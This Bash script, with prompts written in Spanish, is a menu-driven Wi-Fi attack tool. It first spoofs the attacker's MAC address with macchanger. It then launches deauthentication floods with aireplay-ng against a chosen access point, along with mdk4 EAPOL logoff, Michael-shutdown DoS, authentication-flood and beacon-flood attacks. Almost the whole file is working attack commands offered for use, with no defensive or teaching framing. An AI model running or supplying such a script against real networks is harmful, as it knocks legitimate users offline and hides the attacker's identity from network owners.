#!/bin/bash
INTERFACE="wlp3s0mon"
PACKETS=10000

echo "Cambiando automaticamente la MAC Address..."
sudo ifconfig $INTERFACE down
sudo macchanger -r $INTERFACE
sudo ifconfig $INTERFACE up
echo "Nueva MAC Address asignada a $INTERFACE:"
macchanger -s $INTERFACE

cleanup() {
	echo -e "\nTerminando script..."
	kill $(jobs -p) 2>/dev/null
	exit 0
}

trap cleanup SIGINT

read -p "Ingrese el BSSID del AP a atacar (Formato XX:XX:XX:XX:XX:XX): " BSSID

ataque_deautenticacion(){
	echo "Iniciando ataque de Deautenticacion..."
	read -p "Ingrese la cantidad de peticiones que desea enviar (0 para enviar infinitas): " cantidad
	aireplay-ng -0 $cantidad -a $BSSID $INTERFACE
}

attack_logoff(){
	echo "iniciando ataque de logoff..."
	mdk4 $INTERFACE e -t $BSSID -l
}

attack_dos_inteligente(){
	echo "Iniciando ataque de Dos Inteligente..."
	mdk4 $INTERFACE m -t $BSSID -j
}

attack_repeticion(){
	echo "Iniciando ataque de repeticion..."
	mdk4 $INTERFACE a -i $BSSID -m $PACKETS
}

attack_creacion_ssid(){
	echo "Iniciando ataque de creacion SSID"
	mdk4 $INTERFACE b -a -w nta -m
}

modificar_bssid(){
	read -p "Ingrese el nuevo BSSID: " BSSID
	echo "BSSID a sido actualizado a $BSSID"
}

while true; do
	echo "Seleccione un ataque:"
	echo "1) ataque de Deautenticacion"
	echo "2) Ataque de LogOff"
	echo "3) Ataque de DoS Inteligente"
	echo "4) Ataque de Repeticion"
	echo "5) Ataque de Creacion SSID"
	echo "6) Modificar BSSID"
	echo "7) Salir"
	read -p "Ingrese su opcion (1-5): " option

	case $option in
		1) ataque_deautenticacion ;;
		2) attack_logoff ;;
		3) attack_dos_inteligente ;;
		4) attack_repeticion ;;
		5) attack_creacion_ssid ;;
		6) modificar_bssid ;;
		7) cleanup ;;
		*) echo "Opcion invalida. Intente de nuevo." ;;
	esac

	wait

done

echo "Inundacion terminada"